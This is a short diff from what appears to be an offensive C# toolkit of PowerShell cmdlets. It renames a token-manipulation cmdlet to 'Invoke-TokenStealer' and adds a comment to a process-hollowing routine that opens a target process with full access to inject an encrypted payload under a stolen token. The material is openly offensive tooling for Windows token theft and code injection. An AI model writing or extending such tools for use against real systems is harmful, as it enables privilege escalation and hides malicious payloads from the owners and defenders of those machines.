@@ -13,9 +13,9 @@ using TurtleToolKitCrypt;
 
 namespace TurtleToolKit
 {
-    [Cmdlet(VerbsLifecycle.Invoke, "TokenManipulation")] // <- seeting cmdlet name and verbs
-    [Alias("INVTKNM")] //<- cmdlet alias
-    public class InvokeTokenManipulation : Cmdlet
+    [Cmdlet(VerbsLifecycle.Invoke, "TokenStealer")] // <- seeting cmdlet name and verbs
+    [Alias("INVTKN")] //<- cmdlet alias
+    public class InvokeTokenStealer : Cmdlet
     {
         [Parameter(Mandatory = true)] [Alias("procH")] public bool procHollow { get; set; }
         [Parameter(Mandatory = false)] [Alias("e")] public string exe { get; set; }
@@ -188,6 +188,7 @@ namespace TurtleToolKit
         }
         private static bool ExecuteProcessHollow(Cryptor crypt, byte[] payloadBytes, int pid, string exepath)
         {
+            /// took existing proc hollow code and added createprocesswithtoken instead of createprocess
             var allAccessFlags = Win32.ProcessAccessFlags.All;
             IntPtr hProcess1 = Win32.OpenProcess((uint)allAccessFlags, true, pid);
             if (hProcess1 == IntPtr.Zero)
